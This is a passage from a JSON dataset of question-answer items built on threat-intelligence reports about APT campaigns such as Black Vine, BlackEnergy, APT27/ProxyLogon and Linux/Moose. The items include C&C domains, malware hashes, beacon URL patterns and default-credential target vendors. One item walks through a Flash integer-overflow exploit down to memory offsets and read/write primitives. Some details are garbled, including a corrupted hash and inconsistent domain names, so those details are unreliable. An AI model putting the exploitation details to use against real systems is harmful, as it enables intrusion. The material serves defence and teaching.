imageid=iztkctcebtgbbyf-2135928347 (where \"imageid\" is the parameter, \"iztkctcebtgbbyf\" is the encrypted computer name, and \"-2135928347\" is the decimal equivalent of the hard disk serial number)\nAll three variants of Black Vine's malware have the following capabilities:\n\u2022 Open a pipe back door\n\u2022 Execute files and commands\n\u2022 Delete, modify, and create registry keys\n\u2022 Gather and transmit information about the infected computer\nThe following unique traits were identified in the URL patterns seen in network communication requests between the malware and command-and-control (C&C) infrastructure from each variant:\n\u2022 photoid=\n\u2022 resid=\n\u2022 imageid=\n\u2022 vid=\nFor example:\n\u2022 www.polarroute.com/newimage.asp/imageid=oonftwwtwwtzx1755999261&type=0&resid=139890\n\u2022 www.polarroute.com/viewphoto.asp/resid=126546&photoid=oonftwwtwwtzx1755999261\nIn most cases, the malware is made to look like a technology-related application. Some of the themes used to disguise the malware include Media Center, VPN, and Citrix applications. The C&C server or malware-hosting domain is also themed similarly to the malware's disguise. For example, in one instance, a Sakurel sample was named MediaCenter.exe (MD5:1240fbbabd76110a8fC&C9803e0c3ccfb). The C&C domain that the malware communicated with used a Citrix theme: citrix.vipreclod.com\nAdditionally, most of the analyzed malware samples have been digitally signed by Korean software company DTOPTOOLZ Co or embedded software product developer MICRO DIGITAL INC. Symantec has observed that the DTOPTOOLZ Co certificate has been used to sign a malicious binary in adware and malvertising campaigns which are unrelated to Black Vine activity. Both of the digital certificates previously used to sign Black Vine's malware have either expired or been revoked. The details on both of the certificates are as shown in Figures 2 and 3.\nFigure 2. DTOPTOOLZ CO digital certificate details\nFigure 3. MICRO DIGITAL INC. digital certificate details\nMedium Headline: Energy\nIn late December 2012, security researcher Eric Romang , reporting that gas turbine manufacturer Capstone Turbine became a victim of a watering-hole attack. Symantec's investigation confirmed Romang's findings that during the attack, Capstone Turbine's legitimate domain, capstoneturbine.com, was serving an exploit for a zero-day bug known as the  (CVE-2012-4792). Users who browsed Capstone's website using vulnerable versions of Internet Explorer at the time were ultimately compromised with the Sakurel payload. Sakurel provided Black Vine with access to the compromised computers and their information. As previously mentioned, the Sakurel sample seen in this attack was digitally signed by MICRO DIGITAL INC.\nDetails about the Sakurel malware samples associated with the attack are as follows:\n\u2022 MD5 hash: 61fe6f4cb2c54511f0804b1417ab3bd2\n\u2022 C&C domain: web.viprclod.com\n\u2022 Vulnerability: CVE-2012-4792\n\u2022 Compile time: December 8, 2012 07:54:44\nAdditionally, the C&C domain used in the attack, webvipr.clod.com, may be a typo-squat domain designed to pose as the legitimate domain VipeCloud.com. The legitimate website belongs to VipeCloud, which provides sales and marketing automation as a service. This could be a coincidence or re-used infrastructure from other unknown attacks. However, the domain was registered on December 10, 2012, just two days after the Sakurel samples that were used in energy-related attacks were compiled. Regardless, the C&C server theme is not constant with themes we would expect to see with energy-related targets.\nThe following information was used to register the attacker's C&C domain viprclod.com on December 10, 2012:\n\u2022 Domain name: VIPRECLOD.COM\n\u2022 Created on: 10-Dec-12\n\u2022 Expires on: 10-Dec-13\n\u2022 Last Updated on: 10-Dec-12\n\u2022 Administrative contact:\no moon, today  todaymoon321@gmail.com\no xingfudadao\no sitemo, ai no 236963\no Tanzania\nCapstone Turbine is a US-based gas turbine manufacturer which specializes in micro turbine power along with heating and cooling cogeneration systems. Capstone Turbine's intellectual property in the research and development of energy and power technologies is likely what made it a target for cyberespionage.\nOn December 24, 2012, Black Vine targeted a second turbine power and technology manufacturer. While the details of this attack cannot be publicly disclosed, Sakurel was also used in this attack. Considering how Back Vine conducted multiple waves of zero-day attacks and targeted turbine manufacturers, it's likely that the attack group's primary targeted industries at the time were involved in energy-related technologies.\n\nWhat are the key characteristics of the custom malware variants Hurix and Sakurel used by Black Vine, and how do they facilitate cyberespionage activities?",
    "output": "Hurix and Sakurel are custom malware variants used by Black Vine that share several similarities. They both gather the computer name of the target and encrypt data using the same algorithm, which involves division and addition with static variables 1Ah and 61h. They also use similar network communication parameters, such as 'type' initialized with zero value and parameters containing encrypted computer names and hard disk serial numbers. These malware variants facilitate cyberespionage by allowing Black Vine to open backdoors, execute files and commands, delete, modify, and create registry keys, and gather and transmit information about the infected computer.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "BE2 Custom Plugins, Router Abuse, and Target Profiles\nThe BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations lightly documented over the past year. An even more interesting part of the BlackEnergy story is the relatively unknown custom plugin capabilities to attack ARM and MIPS platforms, scripts for Cisco network devices, destructive plugins, a certificate stealer and more. Here, we present available data - it is difficult to collect on this APT. We will also present more details on targets previously unavailable and present related victim profile data.\nThese attackers are careful to hide and defend their long-term presence within compromised environments. The malware's previously undescribed breadth means attackers present new technical challenges in unusual environments, including SCADA networks. Challenges, like mitigating the attackers' lateral movement across compromised network routers, may take an organization's defenders far beyond their standard routine and out of their comfort zone.\n\nBased on the above text, answer a question. How does the BlackEnergy malware pose unique technical challenges for organizations defending SCADA networks, and what specific strategies can these organizations employ to mitigate the attackers' lateral movement across compromised network routers?",
    "output": "The BlackEnergy malware poses unique technical challenges for organizations defending SCADA networks due to its custom plugin capabilities, which include attacking ARM and MIPS platforms, scripts for Cisco network devices, destructive plugins, and a certificate stealer. These capabilities allow attackers to operate in unusual environments, such as SCADA networks, where traditional defenses might not be as effective. To mitigate the attackers' lateral movement across compromised network routers, organizations need to go beyond their standard routines and potentially out of their comfort zones. This could involve implementing advanced network segmentation, enhancing router security configurations, regularly updating firmware, and employing specialized monitoring tools designed for SCADA environments. Additionally, organizations should focus on early detection mechanisms and incident response plans tailored to the specific threats posed by BlackEnergy.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: The benefactors of the scatter fire\nThe APT group Emissary Panda (also known as APT27, LuckyMouse) has exploited the Microsoft Exchange vulnerability \"ProxyLogon\", often publicly referred to as \"Hafnium\" vulnerability, to carry out targeted industrial espionage. The particularly perfidious aspect of this is that they intentionally acted like \"ordinary hackers\" in order not to trigger a comprehensive analysis and remediation. With great success.\nWe analyzed several incidents and found that some customers did not seriously follow up on a ProxyLogon compromise because at first glance it looked like an attack by an occasional attacker. This is how Emissary Panda (APT27) managed to run through the classic APT kill chain and steal trade secrets undetected for months.\nOur report not only provides background and details on the process, the TTPs and the IOCs, but also initial evidence that the OGNL injection in Confluence was and is also being of interest for targeted industrial espionage. The same applies for log4shell.\nMedium Headline: Strategies for Cyber Security 2022\nThe effects of the global vulnerabilities from 2021 will only gradually come to light.\nWe have to assume that numerous APT and other compromises by ProxyLogon (Exchange), OGNL injection (Confluence) and log4shell (Log4j) are still undetected. Especially for log4shell, the typical detection period of three to six months has not even been reached yet.\nIn addition, global vulnerabilities will again come to light and be exploited in 2022. Anything else would be close to a miracle. Companies are therefore well advised to prepare for this. We have the following recommendations based on our experience and findings, which are described more in detail in section (<>)Lessons Learned from 2021 on page (<>)8.\nIf you want to share just the summary with your management, you will find it also short and concise on our webpage:\nBig Headline: 1 Just Another Incident Response investigation?\nIn October 2021, one of our customers was notified by a government agency about suspicious activities on their network. Command and Control (C2) traffic and data exfiltration was allegedly observed. After a quick analysis of the firewall logs, the customer was able to verify the suspicion and realize that the traffic had started several months earlier.\nAs a result, the customer decided to investigate further and ask HvS to conduct a situation assessment. In the first step of the investigation, ten internal systems with C2 traffic were identified and compromise scans of them were performed. These scans proofed a clear compromise of these systems and the presence of HyperBro, a Remote Access Tool (RAT), and other typical attack traces.  A comprehensive Incident Response (IR) was then initiated with the goal of analyzing the entire infrastructure to determine the level of compromise, identify the entry vector, uncover the actor's tactics, techniques, and procedures (TTPs), assess the impact, and finally plan remediation actions.\nUp to this point, this case was a normal Advanced Persistent Threat (APT) incident with common TTPs. The case became interesting when we correlated the Indicators of Compromise (IOC) of this incident with the IOCs of our previous incidents. This correlation led to unexpected matches between incidents that at first glance appeared to be unrelated, which is described in more detail in section (<>)A Spotlight on the Role of (<>)APT Groups.\nOne of the first defensive measures was to deploy an Endpoint Detection and Response (EDR) tool on all endpoints. This was to increase visibility and provide capabilities for containment and response, which later proved to be crucial. While preparing for remediation, the actor began collecting data again, using the domain administrator privileges it had previously gained. This allowed near real-time countermeasures by the IR team, which are described in detail in (<>)Phase 3: Reaction and Last Data Exfiltration. These countermeasures bought management the time to decide on a complete cut-off from the Internet until remediation was finished.\nThe collected IOCs from the forensic analyses, OSINT searches, the observed TTPs, and analogies between the RAT and the HyperBro malware pointed to an attribution to the Emissary Panda1 (<>)group, which was also consistent with the authorities' previous assumption.\nOne of the most interesting facts was the determined entry vector: all identified traces date back exactly to March 04, 2021, the day when the large-scale exploitation of the ProxyLogon vulnerability started. The first system to show C2 traffic was the Exchange server, and within less than an hour, additional systems were affected. While the Exchange Server compromise was detected in March and the system was recovered during that time, the other infected systems were not detected, leaving the door open for the actor. The entire sequence of events leads to the assumption that the exploitation of ProxyLogon in this case was not an opportunistic attack.  When asked by the customer's top management if they could imagine being on the short list of a Chinese actor, they indicated that they were aware of this risk.\n1 aka APT27, TG-3390, Bronze Union, Lucky Mouse, Iron Tiger, UNC215\n\nQuestion: What specific indicators led to the attribution of the attack to Emissary Panda, and how did the timing of the ProxyLogon exploitation support this attribution?\n\nAnswer:",
    "output": "The attribution to Emissary Panda was supported by several indicators, including the collected Indicators of Compromise (IOCs) from forensic analyses, OSINT searches, observed Tactics, Techniques, and Procedures (TTPs), and analogies between the Remote Access Tool (RAT) and the HyperBro malware. Additionally, the timing of the attack was significant; all identified traces dated back to March 4, 2021, the day when the large-scale exploitation of the ProxyLogon vulnerability started. The first system to show Command and Control (C2) traffic was the Exchange server, and within less than an hour, additional systems were affected. This sequence of events suggested that the exploitation of ProxyLogon was not an opportunistic attack but a targeted effort.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the APT group Tarh Andishan use Brute Force: Password Guessing in their Operation Cleaver campaign to gain unauthorized access to targeted systems?",
    "output": "Brute Force: Password Guessing is a technique used by adversaries to systematically guess passwords to gain access to accounts without prior knowledge of legitimate credentials. In the case of Tarh Andishan's Operation Cleaver campaign, the group utilizes a tool called Nbrute, which uses NMap to map the network and then attempts to determine network credentials via brute force. This technique is used in conjunction with other methods, such as SQL injection and spear phishing, to gain initial access to targeted systems. By leveraging Brute Force: Password Guessing, Tarh Andishan is able to compromise Microsoft Windows web servers, Cisco VPNs, and other network infrastructure, ultimately allowing them to establish a persistent presence and exfiltrate sensitive data.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "dad5e918c4ce849f682485bd79e097ac097b554daa897b12151b4595d67980aa 7b801c415f2fb9210c4d89e7d6332c1a812defe78b234d658b60f9337b8f4266 75285821f9997b304058e8bf76c7c3f9f4abcf47e0dffea73d6256f657b9e778 210024ece45a6935da89ab7c5ae3293616679414e96e2157e49f9f607c831bdc 97bbfb81f930d138ff47c3b899eee6917802385b8c8c1626a7679c5cab41c4a2 cbc9e5552cda22130cd7a84cd4b3c68e95eb3f8c2e83dd77253bd1822d1f840d bf00cd1bc34ce457b0e4a99a8df5b7fda512496dc32f2762923254bc85261afb 9de260dcfe2f5a852c0cff238ffc3fe3fc93feff008463af49f68c9f5b5ebc9b cadb1646563a317ac72579e8691c464bab439667811fb0d850bc2e950a3a332c dd3d708ba8ce177fd1f756ac5eb3347a0ec7cf65706438ea5bbdfe9125b0dbe4 31df6ec1089e720c09e29f35ce33203359128c99cc0e4b03ec3e38237e8151ff e349394a043e11410ed3e7c35c70d85dbb9c5e512b593e51e1acde3b404414a2 dddb5843c775ae47b37fd02c378699b4e250ac32739f30e0949bdaa28050a595 42da6fd7f6ba8b90ffd1298d068045c7928cef6506642e69859e0b962b5864a8 e6624eb4520d41516f64aa64a00ee224c8bf257403a12a9665d552348dad1bd5 79ca3b8afac2ca896d7db2110789a187ad75810e2d92aa6f0378f73c1f72006f ad08a0e1dace8d5a443a4bd21ec8d935e267f364ae1b152edaccb0b1f82870d7 b87ada7c17cdb5b7c3cf1e6a0d35515c62112126f2f983c1190a6d9d1060b7db 2ec204d0f35404c2548ac3dbc7b02e5db7ba28d4bc5c701986f0bfcee2a5fa5a 77e1dfaeb73c4edf762f9503c428c1d92af6882b48305f5f5b070ec136575e43 610d37dfb3089b516e4bced89de0c5161614d50ca511853f7be81138dfc4e844 60ff74d053037b5ae70eeaf199a0acba35f58d275d12915ae8ed813dbf9a5b55 376943f886b264824f6063e7dfc54a1a2d5071a3d44dec05208596079d6cf276 89d4d851e6729a854fccb4d4f9277f9f545396714ff2b108d29c7ff418a501a3 18db52a63720187b2afd57667e9ebdcb0a50a8e99909340281dcd07e266d761f bb05a0d905b915e2e84a8e69c2af438f72730131c5a1e3e1fe85df13c61182ac 187155b727346d63c1b1c8e4e3ae88aed89746a4a323b5170139fa5aa760b3a3 7451c813eebe45ee8c743abc5e75c9475cab427d44e9a255f89f73c4e7ca7106 44cd0fdb877838f559d60500cd08cee66d8a79005d7e86f81671c18ec7ab3cb5 810aed604e1ec5d5aec00c783bc44e5ca753c5c0f2dc64f431c8f8d48b6dbf41\n\nWhy did Dimnie, a malware family known since 2014, manage to remain largely undetected until this recent campaign? Discuss the stealthy command and control methods and the target base that contributed to its evasion.",
    "output": "Dimnie managed to remain largely undetected due to its stealthy command and control methods combined with a previously Russian-focused target base. The malware family serves as a downloader and has a modular design encompassing various information-stealing functionalities. Each module is injected into the memory of core Windows processes, further complicating analysis. Its stealthy command and control methods, along with its specific target base, allowed it to fly under the radar up until this most recent campaign.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: How can I tell if my systems were infected?\nIf you are a McAfee VirusScan Engine customer, verify that you are using .DAT 5864 released on January 18, 2010 (McAfee has provided protection to identify this as of release 5862 and is updating as we continue to debug the attack) and perform a full scan on all machines within your enterprise, starting with most sensitive servers. If you detect the following signatures triggered: Exploit-Comele, Roarur.dr or Roarur.dll, you very likely have an infected Aurora host and should reach out to, our vulnerability management and protection services division, for onsite Incident Response Services. You may also take advantage of product, used to clean up an Operation Aurora-infected system.\n\nWhy was it crucial for McAfee VirusScan Engine customers to use .DAT 5864 released on January 18, 2010, and what specific signatures indicated an infection by the Aurora APT?",
    "output": "A: It was crucial for McAfee VirusScan Engine customers to use .DAT 5864 released on January 18, 2010, because this update provided enhanced protection against the Aurora APT. McAfee had initially provided protection starting from release 5862 but continued to update as they further debugged the attack. Specifically, if the following signatures were detected during a full scan: Exploit-Comele, Roarur.dr, or Roarur.dll, it strongly indicated that the system was infected by the Aurora APT. This information was critical for identifying compromised systems and initiating appropriate incident response measures, including reaching out to McAfee's vulnerability management and protection services division for onsite Incident Response Services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 6. CONCLUSION\nLinux/Moose is a novelty when you consider that most embedded threats these days are used to perform DDoS attacks. Considering the rudimentary techniques used by Moose in order to gain access to other devices, it is unfortunate that the security of embedded devices isn't taken more seriously by vendors. With the increasing connectivity and proliferation of Linux-based devices, something will need to be done in that area. We hope that this publication will help vendors better understand how the malicious actors are targeting their devices.\nAs knowledgeable IT people, most of us already check if patches are installed or if anti-virus software is updated and operating when we visit friends and relatives. With all the embedded threats out there, we will need to add a quick check of their router to that to-do list. Consider contributing to our  if you find anything.\nUnfortunately, this type of animal is far from extinct.\nSmall Headline: Detection (yara)\nIn order to identify if a file or a set of files is the Linux/Moose threat you can use the popular yara tool. Using the linux-moose.yarYara rule available from our  you can recursively crawl a directory for Linux/Moose with:\nIf the command yields no output then no files were identified to be Linux/Moose. Otherwise identified filenames are printed.\nFurther modifications made by the malware author to evade detection will impact the usefulness of this Yara rule over time.\nMedium Headline: APPENDIX C: CLEANING\nReboot the affected device then change its password as soon as possible. Keep in mind, however, that the compromised system was accessible via credentials that the operators knew, that they were aware of its IP address and they had means to access its interactive console. They might have had manual access, which means that further infection is possible, including  (the link is in German). A factory reset, firmware update or reinstall and password change is probably best.\nMedium Headline: APPENDIX D: PREVENTION\nChange default passwords on network equipment even if it is not reachable from the Internet. Disable Telnet login and use SSH where possible.\nMake sure that your router is not accessible from the Internet on ports 22 (SSH), 23 (Telnet), 80 (HTTP) and 443 (HTTPS). If you are unsure about how to perform this test, when you are at home, use the \"common ports\" scan from the . Make sure that the above mentioned ports receive a Stealth or Closed status.\nRunning the latest firmware available from your embedded device vendor is also recommended.\nMedium Headline: APPENDIX E: POTENTIALLY TARGETED VENDORS\nNote To obtain the latest version of this list check our\nWe have cross-referenced the list of  in order to spread with a list of vendors known to have these as default credentials and confirmed that some of their products have Telnet access enabled. Here is the list of potentially targeted vendors we've come up using this methodology:\nNetwork equipment vendors\n3Com, Alcatel-Lucent, Allied Telesis, Avaya, Belkin, Brocade, Buffalo, Celerity, Cisco,\nD-link, Enterasys, Hewlett-Packard, Huawei, Linksys, Mikrotik, Netgear, Meridian, Nortel, SpeedStream, Thomson, TP-Link, Zhone, ZyXEL\nAppliances vendors\nAPC, Brother, Konica/Minolta, Kyocera, Microplex, Ricoh, Toshiba, Xerox\nInternet of Things vendors\nHik Vision, Leviton\nKeep in mind that this is a list of potentially targeted vendors. Current Moose versions need some Unix-type shell access in order to infect a machine where it successfully logged in. On some devices this type of access is hidden behind another set of credentials or tech-support secret passwords. Moose doesn't target these environments. Since we don't have access to the hardware for testing we couldn't validate this aspect in the above lists.\nIf you have access to any of this hardware please :\n\u2022 Is Telnet enabled by default?\n\u2022 Can you login with the default credentials via Telnet?\n\u2022 What make and model do you have?\n\u2022 What happens if you type in sh and then Enter on the default prompt?\nIf the credentials can be used via Telnet to login, if Telnet is enabled by default and if a shell access can be obtained by typing sh in the device's prompt, then these are very good indicators that a device could be infected by Linux/Moose.\nThe last list below contains vendors that were correlated using the as previously mentioned but that we were not able to gather information about if they had Telnet access enabled or not.\nEricsson, F5 Networks, Fortinet, Siemens, LSI Corporation, Maxim Integrated, Accelerated Network, Quantum, Advantek, Airtel, AirTies, Radware, Ubee Interactive, AOC, Applied Innovations, Arescom, ARtem, Asante, Ascend, ATL, Atlantis, AVM, Avocent, Axis, Aztech, Bay Networks, Bintec, BMC, Broadlogic, Canyon, Cellit, Ciphertrust, CNet, Compaq, Comtrend, Conceptronic, Conexant, Corecess, CTC Union, Cyclades, Davox, Demarc, Digicom, Draytek, Dynalink, E-Con, Efficient, Everfocus, Flowpoint, Gericom, IBM, iDirect, Inchon, Infacta, Infoblox, INOVA, Interbase, Intermec, Intracom, JD Edwards, Kasda, KTI, Lantronix, Laxo, LG, Livingston, Marconi, McAfee, McData, Mentec, Micronet, Milan, Motorola, Mro software, Netopia, Netport, Netscreen, Netstar, Niksun, Nokia, NOMADIX, Olitec(trendchip), OpenConnect, Osicom, Overland, Ovislink, Pansonic, Phoenix, Pirelli, Planet, Ptcl, QLogic, Quintum Technologies, RM, RoamAbout, Sagem, Samsung, Server TechnologyPower, Sharp, Signamax, Siips, Silex Technology, Simple Smdr, Sitecom, Smartswitch, SMC, Sonic-X, Spectra Logic, SpeedXess, Sphairon, SSA, Stratacom, Swissvoice, Symbol, System/32, Tandem, Telewell, Telindus, Tellabs, Topsec, Troy, TVT System, U.S. Robotics, Unisys, VASCO, VxWorks, Wang, Weidm\u00fceller, Westell, X-Micro, xd, Xylan, Xyplex, Zebra, ZTE\nIf you know that a particular vendor make and model that could be affected please contact us and contact them.\n\nQuestion: What preventive measures can be implemented to mitigate the risk of Linux/Moose infections on network equipment, and why are these measures crucial for maintaining security?\n\nAnswer:",
    "output": "Preventive measures include changing default passwords on network equipment, disabling Telnet login and using SSH where possible, ensuring the router is not accessible from the Internet on specific ports (22, 23, 80, 443), and running the latest firmware available from the vendor. These measures are crucial for maintaining security because they reduce the attack surface and make it more difficult for malware like Linux/Moose to exploit vulnerabilities in network devices.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Defending Against Targeted Attacks\nSufficiently motivated threat actors can penetrate even networks that use moderately advanced security measures. As such, apart from standard and relevant attack prevention measures and mechanisms like solid patch management; endpoint and network security; firewall use; and the like, enterprises should also focus on detecting and mitigating attacks. Moreover, data loss prevention (DLP) strategies that identify the data an organization is protecting and take into account the context of data use should be employed.\nMedium Headline: Local and External Threat Intelligence\nThreat intelligence refers to indicators that can be used to identify the tools, tactics, and procedures threat actors engaging in targeted attacks use. Both external and local threat intelligence is crucial for developing the ability to detect attacks early. The following are the core components of this defense strategy:\n\u2022 Enhancing visibility: Logs from endpoint, server, and network monitoring are an important and often underused resource that can be aggregated to provide a view of the activities within an organization that can be processed for anomalous behaviors, which can indicate a targeted attack.\n\u2022 Performing integrity checks: In order to maintain persistence, malware will make modifications to the file system and registry. Monitoring such changes can indicate the presence of malware.\n\u2022 Empowering the human analyst: Humans are best positioned to identify anomalous behaviors when presented with a view of aggregated logs from across a network. This information is used in conjunction with custom alerts based on the local and external threat intelligence available.\nTechnologies available today like Deep Discovery provide visibility, insight, and control over networks to defend against targeted threats.11 Deep Discovery uniquely detects and identifies evasive threats in real-time and provides in-depth analysis and actionable intelligence to prevent, discover, and reduce risks.\n11\nMedium Headline: Mitigation and Cleanup Strategy\nOnce an attack is identified, the cleanup strategy should focus on the following objectives:\n\u2022 Determine the attack vector and cut off communications with the C&C server.\n\u2022 Determine the scope of the compromise.\n\u2022 Assess the damage by analyzing the data and forensic artifacts available on compromised machines.\nRemediation should be applied soon afterward, which includes steps to fortify affected servers, machines, or devices into secure states, informed in part by how the compromised machines were infiltrated.\nMedium Headline: Data-Centric Protection Strategy\nThe ultimate objective of targeted attacks is to acquire sensitive data. As such, DLP strategies that focus on identifying and protecting confidential information are critical. Enhanced data protection and visibility across an enterprise provides the ability to control access to sensitive data as well as monitor and log successful and unsuccessful attempts to access it. Enhanced access control and logging capabilities allow security analysts to locate and investigate anomalies, respond to incidents, and initiate remediation strategies and damage assessment.\nBig Headline: Trend Micro Threat Protection Against the Safe Campaign\nPart of processing and identifying the components of the Safe campaign is creating a list of indicators of compromise (IOCs) to help organizations better identify and locate certain tools, malware, and traffic patterns that could indicate compromise.\nThe following table summarizes the Trend Micro solutions for the components of the Safe campaign. Trend Micro recommends a comprehensive security risk management strategy that goes further than advanced protection to meet the real-time threat management requirements of dealing with targeted attacks.\nBig Headline: SAFE\n\u2022 First Seen\nIndividual targeted attacks are not one-off attempts. Attackers continually try to get inside the target's network.\nThe Safe campaign was first seen on October 2012.\n\u2022 Victims and Targets\nTargeted threats target specific industries or communities of interest in specific regions.\nThe Safe campaign was able to compromise government ministries, technology companies, media outlets, academic research institutions, and nongovernmental organizations.\nFurthermore, it was discovered that the average number of actual victims remained at 71 per day, with few if any changes from day to day.\n\u2022 Operations\nFirst-stage computer intrusions often use social engineering. Attackers custom-fit attacks to their targets.\nThe Safe campaign attackers used spear-phishing emails with malicious attachments. Attackers used several malicious documents that all exploited a Microsoft Office\u00ae vulnerability (i.e., CVE-2012-0158). If opened with a version of Microsoft Word\u00ae that is not up-to-date, a malicious payload is silently installed on the user's computer.\nIn addition, one of the C&C servers used in the Safe campaign was set up in such a way that the contents of the directories were viewable to anyone who accessed them.\n\u2022 Possible Indicators of Compromise\nAttackers want to remain undetected as long as possible. A key characteristic of targeted attacks is stealth.\nBelow is a list of the components of the Safe campaign.\nNetwork traffic identifiers:\n\u00bb Network traffic going to mongolbaatarsonin. in\n\u00bb Network traffic going to withoutcake.com\n\u00bb Network traffic going to mongolbaatar.us \u00bb Network traffic going to getapencil.com\n\u00bb User-agent identified as \"Fantasia\"\n\u00bb Communication with any URL with the sub-URL, /safe/record.php\nHost-based identifiers:\n\u00bb Presence of SafeExt.dll on the host (commonly found in %Program Files%\\ Internet Explorer\\SafeNet\\)\n\u00bb Presence of SafeCredential.DAT on the host (commonly found in %Program Files%\\ Internet Explorer\\SafeNet\\)\n\u00bb Presence of the directory, %Program Files%\\Internet Explorer\\SafeNet\\\n\u00bb Modification of certain registry values\nMalware files:\n\u00bb TROJ_FAKESAFE.SMA\n\u00bb TROJ_DROPER.SMA\n\u00bb TROJ_DROPDET.A\n\u00bb TROJ_MDROP.DET\n\u00bb ADW_ADSTART\n\u00bb TROJ_CONNECT.DET\n* More information on the Safe campaign can be seen in the Trend Micro research paper, \".\"\nMedium Headline: TREND MICRO\u2122\nTrend Micro Incorporated, a global cloud security leader, creates a world safe for exchanging digital information with its Internet content security and threat management solutions for businesses and consumers. A pioneer in server security with over 20 years experience, we deliver top-ranked client, server, and cloud-based security that fits our customers' and partners' needs; stops new threats faster; and protects data in physical, virtualized, and cloud environments. Powered by the Trend Micro\u2122 Smart Protection Network\u2122 infrastructure, our industry-leading cloud-computing security technology, products and services stop threats where they emerge, on the Internet, and are supported by 1,000+ threat intelligence experts around the globe. For additional information, visit (<http://www.trendmicro.com>)www.trendmicro.com.\n\nAnswer this question based on the above context: How can enterprises enhance their visibility to detect targeted attacks like the Safe campaign? What specific actions and technologies can be employed?",
    "output": "Enterprises can enhance their visibility to detect targeted attacks by aggregating logs from endpoint, server, and network monitoring. These logs provide a comprehensive view of activities within the organization, which can then be processed to identify anomalous behaviors indicative of a targeted attack. Technologies like Deep Discovery can provide visibility, insight, and control over networks to defend against targeted threats. Deep Discovery uniquely detects and identifies evasive threats in real-time and provides in-depth analysis and actionable intelligence to prevent, discover, and reduce risks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Adobe Flash Player version checks\nThe nature of the vulnerability is an integer overflow, and the exploit code has quite extensive subroutines in it. It tries to cover versions of the player from 11.x to the most recent version at the time of the campaign, 20.0.0.235.\nThe earliest version of Adobe Flash Player 11.x was released in October 2011 (11.0.1.152) and the last version of Adobe Flash Player 10.x was released in June 2013 (10.3.183.90). This doesn't necessarily mean the exploit existed from 2011 or 2013, but it again demonstrates the broad target the exploit tries to cover.\nMainly we focused our analysis upon the function named qeiofdsa, as the routine covers any Adobe Flash player version since 19.0.0.185 (released on September 21, 2015).\nWhy is this version of Flash Player so important? Because that is the release which had the latest Vector length corruption hardening applied at the time of the incident. The original Vector length hardening came with 18.0.0.209 (<https://blogs.adobe.com/security/2015/12/community-collaboration-enhances-flash.html>)and it is well explained in the Security @ Adobe blog https://blogs.adobe.com/security/2015/12/community-collaboration-enhances-flash.html.\nThe Vector object from Adobe Flash Player can be used as a corruption target to acquire read or write (RW) primitives.\nThis object has a very simple object structure and predictable allocation patterns without any sanity checks on the objects. This made this object a very popular target for exploitation for recent years. There were a few more bypasses found after that hardening, and 19.0.0.185 had another bypass hardening. The exploit uses a new exploitation method (ByteArray length corruption) since this new version of Adobe Flash Player.\nNote, however, that with new mitigation from Adobe released after this incident, the ByteArray length corruption method no longer works.\nTo better understand the impact of the mitigations on attacker patterns, we compared exploit code line counts for the pdfsajoe routine, which exploits Adobe Flash Player versions earlier than 19.0.0.185, to the qeiofdsa routine, which exploits versions after 19.0.0.185. We learned that pdfsajoe has 139 lines of code versus qeiofdsa with 5,021.\nWhile there is really no absolute way to measure the impact and line code alone is not a standard measurement, we know that in order to target the newer versions of Adobe Flash Player, the attacker would have to write 36 more times the lines of code.\nThis tells us a lot about the importance of mitigation and the increasing cost of exploit code development. Mitigation in itself doesn't fix existing vulnerabilities, but it is definitely raising the bar for exploits.\nMedium Headline: Heap spraying and vulnerability triggering\nThe exploit heavily relies on heap spraying. Among heap spraying of various objects, the code from Figure 3 shows the code where the ByteArray objects are sprayed. This ByteArray has length of 0x10. These sprayed objects are corruption targets.\nThe vulnerability lies in the implementation of fast memory opcodes. More detailed information on the usage of fast memory opcodes are available in the (<http://www.adobe.com/devnet/air/articles/faster-byte-array-operations.html>)Faster byte array operations with ASC2 article at the Adobe Developer Center.\nAfter setting up application domain memory, the code can use avm2.intrinsics.memory. The package provides various methods including li32 and si32 instructions. The li32 can be used to load 32bit integer values from fast memory and si32 can be used to store 32bit integer values to fast memory. These functions are used as methods, but in the AVM2 bytecode level, they are opcode themselves.\nDue to the way these instructions are implemented, the out-of-bounds access vulnerability happens (Figure 5). The key to this vulnerability is the second li32 statement just after first li32 one in each IF statement. For example, from the li32((_local_4+0x7FEDFFD8)) statement, the _local_4+0x7FEDFFD8 value ends up as 4 after integer overflow. From the just-in-time (JIT) level, the range check is only generated for this li32 statement, skipping the range check JIT code for the first li32 statement.\nWe compared the bytecode level AVM2 instructions with the low-level x86 JIT instructions. Figure 6 shows the comparisons and our findings. Basically two li32 accesses are made and the JIT compiler optimizes length check for both li32 instructions and generates only one length check. The problem is that integer overflow happens and the length check code becomes faulty and allows bypasses of ByteArray length restrictions. This directly ends with out-of-bounds RW access of the process memory. Historically, fast memory implementation suffered range check vulnerabilities (CVE-2013-5330, CVE-2014-0497). The Virus Bulletin 2014 paper by Chun Feng and Elia Florio, Ubiquitous Flash, ubiquitous exploits, ubiquitous mitigation ((<https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-FengFlorio.pdf>)PDF download), provides more details on other old but similar vulnerabilities.\nUsing this out-of-bounds vulnerability, the exploit tries to locate heap-sprayed objects.\nThese are the last part of memory sweeping code. We counted 95 IF/ELSE statements that sweep through memory range from ba+0x121028 to ba+0x17F028 (where ba is the base address of fast memory), which is 0x5E000 (385,024) byte size. Therefore, these memory ranges are very critical for this exploit's successful run.\nThis exploit uses a corrupt ByteArray.length field and uses it as RW primitives (Figure 9).\nAfter ByteArray.length corruption, it needs to determine which ByteArray is corrupt out of the sprayed ByteArrays (Figure 10).\nMedium Headline: RW primitives\nThe following shows various RW primitives that this exploit code provides. Basically these extensive lists of methods provide functions to support different application and operating system flavors.\nFor example, the read32x86 method can be used to read an arbitrary process's memory address on x86 platform. The cbIndex variable is the index into the bc array which is an array of the ByteArray type. The bc[cbIndex] is the specific 